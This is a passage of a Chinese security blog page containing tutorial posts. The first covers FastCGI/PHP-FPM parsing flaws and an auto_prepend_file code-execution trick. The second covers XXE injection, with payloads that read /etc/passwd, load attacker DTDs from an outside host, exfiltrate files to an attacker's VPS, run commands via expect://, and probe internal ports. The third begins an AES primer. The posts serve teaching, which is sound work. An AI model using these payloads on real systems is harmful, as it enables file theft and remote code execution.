nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>

<ul>
<li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li>
<li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li>
<li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li>
<li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li>
</ul>
<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p><strong>PHP</strong>–<strong>FPM</strong>(FastCGI Process Manager：FastCGI进程管理器)是一个<strong>PHP</strong>FastCGI管理器，对于<strong>PHP</strong> 5.3.3之前的<strong>php</strong>来说，是一个补丁包 ，旨在将FastCGI进程管理整合进<strong>PHP</strong>包中。</p>
<p>也就是phpcgi传输协议中的内容是去交给PHP-FPM去解析的，解析完毕后才会去服务器上取所需数据返回给客户端。</p>
<p><strong>FPM按照fastcgi的协议将TCP流解析成真正的数据</strong></p>
<p>例如用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，对应传递的环境变量参数为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且由fpm解析后可得需要访问的文件为<code>SCRIPT_NAME</code>所指向的文件<code>/var/www/html/index.php</code>，进而从服务器取得数据返回客户端</p>
<h3 id="Nginx-IIS7解析漏洞"><a href="#Nginx-IIS7解析漏洞" class="headerlink" title="Nginx/IIS7解析漏洞"></a>Nginx/IIS7解析漏洞</h3><p>在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时会传递如下环境变量参数给FPM解析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们需要先来了解一下<code>Path Info</code>模式，这是一种URL重写功能，例如如下URL <code>http://your_ip/index.php/article</code>这里的index.php并不是目录，而是使用了url重写功能来实现了更好的加载静态资源文件，而<code>fix_pathinfo</code>正属于<code>Path Info</code>下的一种产物，其作用是如果遇到了不认识的文件名会向前递归，本意是为了处理<code>http://your_ip/index.php/test</code>这种url，但是如果传递了之前的那种<code>SCRIPT_NAME</code>为<code>/favicon.ico/.php</code>的文件，就会把ico文件当作php文件来解析</p>
<p>第二种利用存在的文件名取Path Info,例如<code>http://127.0.0.1/1.jpg/1.php</code>，将<code>script_name</code>传给php-fpm来解析，<strong>fpm会将1.jpg作为php文件来解析，而将1.php作为path_info，</strong>最终getshell</p>
<h3 id="fpm任意代码执行漏洞"><a href="#fpm任意代码执行漏洞" class="headerlink" title="fpm任意代码执行漏洞"></a>fpm任意代码执行漏洞</h3><p>之前我们利用的解析漏洞所能达到的效果是执行服务器上的你想去执行的文件，但我们并不能去执行我们所需要执行的php代码，这时需要用到php的两个设置<code>auto_prepend_file</code>和<code>auto_append_file</code>.</p>
<blockquote>
<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
</blockquote>
<p>这里可以用<code>auto_prepend_file</code>和<code>php:input//</code>去getshell，将auto_prepend_file设置为php://input，这样每次运行文件都要将php://input所post的内容包含并且执行，也就是将我们所需要执行的代码放在fastcgi中的body，那么每次就可以造成RCE漏洞，注意php.ini需要allow_url_include</p>
<p>设置auto_prepend的方法：<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。传入如下环境变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将想要执行的代码放入body中，即可造成任意代码执行</p>
<p>P牛写的工具：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>实际上也可以通过这个生成gopher payload去打内网fastcgi</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/%E5%88%9D%E6%8E%A2Fastcgi%E5%AE%89%E5%85%A8/" data-id="ckabsu3910039kkvr1gbpcvy8" class="article-share-link" data-share="baidu" data-title="初探Fastcgi安全">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/%E5%88%9D%E6%8E%A2Fastcgi%E5%AE%89%E5%85%A8/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xml注入攻击" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="article-date">
  <time datetime="2019-06-01T08:38:28.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">xml注入攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="XML注入基础知识"><a href="#XML注入基础知识" class="headerlink" title="XML注入基础知识"></a>XML注入基础知识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line"></span><br><span class="line">&lt;to&gt;a1han&lt;&#x2F;to&gt;</span><br><span class="line"></span><br><span class="line">&lt;from&gt;aohan&lt;&#x2F;from&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>



<p> <code>version</code>显示的是版本号,<code>encoding</code>显示的是所用的编码方式,<code>note</code>则是根元素，note中的元素为子元素.</p>
<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
<h3 id="文档规范：DTD"><a href="#文档规范：DTD" class="headerlink" title="文档规范：DTD"></a>文档规范：DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。<br>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
<p><strong>DTD可以在xml文档内部声明，也可以在外部引用，通常造成漏洞的则是外部引用</strong>DTD在内部声明有严格的规范：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>//定义 note 元素有四个元素："to、from、heading,、body"</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>定义 to 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>定义 from 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>note为根元素，其余为子元素,<code>PCDATA</code>声明表示内部标记符号进行解析，所以需要引用实体，<code>CDATA</code>表示内部标记符号不进行解析，不需要引用实体符号</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rowd7u7wj30yg0dm41k.jpg" alt=""></p>
<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p><strong>内部DTD实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [ &lt;!ENTITY a1han &quot;666&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a1han “666&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;xxe&gt;</span><br><span class="line"></span><br><span class="line">&amp;a1han;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;xxe&gt;</span><br></pre></td></tr></table></figure>

<p>访问此xml文档，&a1han;被解析为666输出</p>
<h3 id="XML注入三种姿势"><a href="#XML注入三种姿势" class="headerlink" title="XML注入三种姿势"></a>XML注入三种姿势</h3><p>方法1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>方法2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;www.hackersb.cn&#x2F;attack.dtd&quot;&gt; %d; ]&gt;</span><br></pre></td></tr></table></figure>

<p>方法3：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;www.hackersb.cn&#x2F;attack.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>attack.dtd内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="有回显XXE注入"><a href="#有回显XXE注入" class="headerlink" title="有回显XXE注入"></a>有回显XXE注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$xml&#x3D;simplexml_load_string($_GET[‘xml’]);</span><br><span class="line"></span><br><span class="line">print_r((string)$xml);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt”&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<p><strong>这里要注意的是一定要将payload进行url编码</strong></p>
<p>如果要读取<code>php,html</code>文件，为了避免冲突，要用 <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0″ encoding&#x3D;&quot;utf-8″?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM “php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<h3 id="无回显条件测试"><a href="#无回显条件测试" class="headerlink" title="无回显条件测试"></a>无回显条件测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$xml&#x3D;simplexml_load_string($_GET[‘xml’]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此步少了print_r，无法得到回显信息，对于无回显的条件，可利用参数实体发起http请求来攻击</p>
<p><strong>读取本地文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8”?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % dtd SYSTEM “http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line"></span><br><span class="line">%dtd; %all;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xxe.xml文件内容</strong></p>
<p><code>&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘http://yourvps/%file;&#39;&gt;”&gt;</code></p>
<p>讲此Payload进行url编码，在自己vps上的access.log上即可查看到文件内容</p>
<p>对于payload的解读：解析%dtd引入xxe.xml,,解析%all引入send实体，然后将%file文件内容作为http请求发送出去</p>
<p>同样如果要查看其他文件的话</p>
<p><code>php://filter/read=convert.base64-encode/resource=etc/passwd</code></p>
<h3 id="XXE危害"><a href="#XXE危害" class="headerlink" title="XXE危害"></a>XXE危害</h3><ul>
<li>读取任意文件</li>
<li>执行系统命令</li>
<li>探测内容端口</li>
<li>攻击内网网站</li>
</ul>
<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>需要在php环境安装expect扩展，执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h4 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&#x2F;payload&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XXE的防御手段"><a href="#XXE的防御手段" class="headerlink" title="XXE的防御手段"></a>XXE的防御手段</h3><p>1.过滤用户提交数据</p>
<p>2.禁用外部实体的调用</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/01/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" data-id="ckabsu3900035kkvrfas7hy85" class="article-share-link" data-share="baidu" data-title="xml注入攻击">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/01/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Cryptoѧϰ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/01/Crypto%D1%A7%CF%B0/" class="article-date">
  <time datetime="2019-06-01T08:33:07.000Z" itemprop="datePublished">2019-06-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/01/Crypto%D1%A7%CF%B0/">Crypto学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="AES加密原理剖析"><a href="#AES加密原理剖析" class="headerlink" title="AES加密原理剖析"></a>AES加密原理剖析</h3><p><strong>浅谈AES</strong></p>
<p>AES加密属于对称加密算法，与RSA不同的是，这类算法对明文的加密与解密都使用的是同一个密钥。</p>
<p>AES三种长度的密钥(不同的密钥长度有着不同的加密轮数)：</p>
<p>AES128: 10轮</p>
<p>AES192: 12轮</p>
<p>AES256: 14轮</p>
<p>从安全性来讲:AES128性能最高,AES256安全性最高。</p>
<p><strong>AES分组加密特性</strong></p>
<p><img src="https://img-blog.csdn.net/20180412234343842?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vYWt1bg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
<p>AES在加密时，会将明文分成多个明文块，每块为16字节，128bit。明文经过AES加密器的处理生成密文块，将密文块拼接在一起，就是最后加密的结果。</p>
<p><strong>Padding</strong></p>
<p>在上面的假设中，我们的假设都是明文长度为16字节的整数倍，当明文长度不为16字节的整数倍时，此时就需要进行padding填充。下面介绍几种填充模式</p>
<ul>
<li>NoPadding:不做任何填充，要求明文字节长度必须是16的整数倍。</li>
<li>PKCS5adding(默认填充方式):如果明文块少于16个字节，则在明文块末尾补足相应数量的字符，并且每个字节的值等于缺少的字符数。如明文{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则补全为{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6}。</li>
<li>IS010126Padding:如果明文块少于十六个字节，在明文块末尾补足相应数量的字节，最后一个字符为缺少的字符数，其他字符都为随机字符。如：比如明文：{1,2,3,4,5,a,b,c,d,e},缺少6个字节，则可能补全为{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}</li>
</ul>
<p><strong>注意点：AES加密与解密必须使用相同的填充方式。</strong></p>
